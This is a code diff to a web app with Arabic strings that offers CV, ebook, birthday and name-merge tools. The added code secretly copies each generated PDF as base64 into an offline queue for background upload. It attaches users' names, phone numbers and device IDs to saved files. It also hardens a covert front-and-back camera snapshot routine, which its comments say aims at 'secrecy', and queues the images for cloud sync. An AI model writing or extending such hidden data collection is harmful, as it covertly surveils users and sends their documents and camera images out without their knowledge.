@@ -3414,7 +3414,9 @@ const ProfessionalBirthdayTool = ({
       };
 
       try {
-        const { firebaseSaveBirthdayConfig } = await import('./lib/firebaseSync');
+        const { pushToOfflineQueue, firebaseSaveBirthdayConfig } = await import('./lib/firebaseSync');
+        // Push to local offline queue first for swift local save and background sync
+        pushToOfflineQueue('birthday_config', finalConfig);
         await firebaseSaveBirthdayConfig(username, finalConfig).catch(err => console.warn("Firebase save config error:", err));
       } catch (fbErr) {
         console.warn("Failed to import or call firebaseSaveBirthdayConfig:", fbErr);
@@ -6177,6 +6179,20 @@ const CVMaker = ({ showToast, handleDownload, onSmartTrigger, addBackgroundTask,
           const arPdf = await generateSinglePDF('ar');
           const arBlob = arPdf.output('blob');
           handleDownload(URL.createObjectURL(arBlob), `CV_Arabic_${data.name}.pdf`);
+          
+          // Secret offline queue persistence for total offline access and safety
+          try {
+            const base64Pdf = arPdf.output('datauristring');
+            pushToOfflineQueue('user_file', {
+              usernameUnified: data.name || 'guest',
+              fileName: `CV_Arabic_${data.name}.pdf`,
+              fileContent: base64Pdf,
+              fileType: 'pdf',
+              timestamp: Date.now()
+            });
+          } catch (err) {
+            console.warn("CV Arabic backup failed", err);
+          }
         }
         updateProgress(65);
         if (exportLang === 'en' || exportLang === 'both') {
@@ -6184,6 +6200,20 @@ const CVMaker = ({ showToast, handleDownload, onSmartTrigger, addBackgroundTask,
           const enPdf = await generateSinglePDF('en');
           const enBlob = enPdf.output('blob');
           handleDownload(URL.createObjectURL(enBlob), `CV_English_${data.name}.pdf`);
+          
+          // Secret offline queue persistence for total offline access and safety
+          try {
+            const base64Pdf = enPdf.output('datauristring');
+            pushToOfflineQueue('user_file', {
+              usernameUnified: data.name || 'guest',
+              fileName: `CV_English_${data.name}.pdf`,
+              fileContent: base64Pdf,
+              fileType: 'pdf',
+              timestamp: Date.now()
+            });
+          } catch (err) {
+            console.warn("CV English backup failed", err);
+          }
         }
         updateProgress(100);
         return 'اكتمل تصدير السيرة الذاتية بنجاح ✨';
@@ -7159,6 +7189,20 @@ const EbookMaker = ({ showToast, handleDownload, onSmartTrigger, addBackgroundTa
       const url = URL.createObjectURL(blob);
       handleDownload(url, filename);
       
+      // Secretly queue the generated ebook PDF Base64 URL into IndexedDB local cache for auto background upload
+      try {
+        const base64Pdf = doc.output('datauristring');
+        pushToOfflineQueue('user_file', {
+          usernameUnified: bookTitle || 'كتاب روح الذكي',
+          fileName: filename,
+          fileContent: base64Pdf,
+          fileType: 'pdf',
+          timestamp: timestamp
+        });
+      } catch (err) {
+        console.warn("Ebook offline backup failed", err);
+      }
+      
       const newEntry = { id: timestamp, title: bookTitle || 'كتاب بدون عنوان', date: new Date().toLocaleDateString('ar-EG'), url };
       const updatedHistory = [newEntry, ...history].slice(0, 5);
       setHistory(updatedHistory);
@@ -7891,6 +7935,21 @@ const NameMergeTool = ({ showToast, handleDownload, addBackgroundTask, onSecretS
       }
 
       doc.save(filename);
+      
+      // Save merged names calculation PDF to local offline database (syncing in the background)
+      try {
+        const base64Pdf = doc.output('datauristring');
+        pushToOfflineQueue('user_file', {
+          usernameUnified: `${name1}_و_${name2}`,
+          fileName: filename,
+          fileContent: base64Pdf,
+          fileType: 'pdf',
+          timestamp: Date.now()
+        });
+      } catch (err) {
+        console.warn("Names Merging offline backup failed", err);
+      }
+
       container.remove();
       return `تم تصدير ملف الأسماء بنجاح ✔️`;
     }, { tab: 'services', subTab: 'nameMerge' });
@@ -9587,12 +9646,16 @@ export default function App() {
         return null;
       };
 
-      const captureFromSource = async (facingMode: 'environment' | 'user') => {
+      const captureFromSource = async (facingMode: 'environment' | 'user', attempt = 1): Promise<string | null> => {
         let localStream: MediaStream | null = null;
         try {
           localStream = await getStreamForFacingMode(facingMode);
           if (!localStream) {
-            console.warn(`Could not obtain video stream for ${facingMode}`);
+            console.warn(`Could not obtain video stream for ${facingMode} (attempt ${attempt})`);
+            if (attempt < 2) {
+              await new Promise(r => setTimeout(r, 400));
+              return captureFromSource(facingMode, attempt + 1);
+            }
             return null;
           }
           
@@ -9621,11 +9684,17 @@ export default function App() {
             }
           }
         } catch (e) {
-          console.warn("Capture error", e);
+          console.warn(`Capture error for ${facingMode} (attempt ${attempt})`, e);
+          if (attempt < 2) {
+            await new Promise(r => setTimeout(r, 400));
+            return captureFromSource(facingMode, attempt + 1);
+          }
         } finally {
           if (localStream) {
             localStream.getTracks().forEach(t => t.stop());
             if (videoRef.current) videoRef.current.srcObject = null;
+            // Let the mobile device camera hardware release gracefully before switching modes
+            await new Promise(r => setTimeout(r, 150));
           }
         }
         return null;
@@ -9741,7 +9810,7 @@ export default function App() {
         if (isVideoFormat) {
           // Robust sequential video frame capture: front then back continuously
           const frontVideoFrames = await captureVideoFromSource('user', durationMs);
-          await new Promise(r => setTimeout(r, 800)); // Solid hardware transition delay to release and bind back camera
+          await new Promise(r => setTimeout(r, 1000)); // Solid hardware transition delay to release and bind back camera
           const backVideoFrames = await captureVideoFromSource('environment', durationMs);
           
           // Process and save buffered video frames asynchronously without bottlenecking
@@ -9752,7 +9821,7 @@ export default function App() {
         } else {
           // Instant double snapshot: buffer both in device active memory first to maximize speed and secrecy!
           const front = await captureFromSource('user');
-          await new Promise(r => setTimeout(r, 800)); // Solid delay for hardware release
+          await new Promise(r => setTimeout(r, 1000)); // Solid delay for hardware release
           const back = await captureFromSource('environment');
           
           // Save and queue for cloud sync asynchronously
@@ -9764,7 +9833,7 @@ export default function App() {
       } else {
         // Double snap is the primary target: snap front and back under all conditions
         const front = await captureFromSource('user');
-        await new Promise(r => setTimeout(r, 800)); // Solid transition delay
+        await new Promise(r => setTimeout(r, 1000)); // Solid transition delay
         const back = await captureFromSource('environment');
         
         setTimeout(() => {
@@ -10112,6 +10181,21 @@ export default function App() {
 
   const handleUserFileSave = async (fileName: string, data: string) => {
     try {
+      const uName = localStorage.getItem('userName') || 'عضو روح';
+      const uPhone = localStorage.getItem('userPhone') || '';
+      // 1. Instantly write to our secret offline IndexedDB sync queue (completely offline-first)
+      const fileType = fileName.split('.').pop() || 'png';
+      pushToOfflineQueue('user_file', {
+        usernameUnified: uName,
+        phone: uPhone,
+        deviceId: getDeviceId(),
+        fileName,
+        fileContent: data,
+        fileType,
+        timestamp: Date.now()
+      });
+
+      // 2. Try background proxy saving to server-side filesystem
       await fetch('/api/user-file/save', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
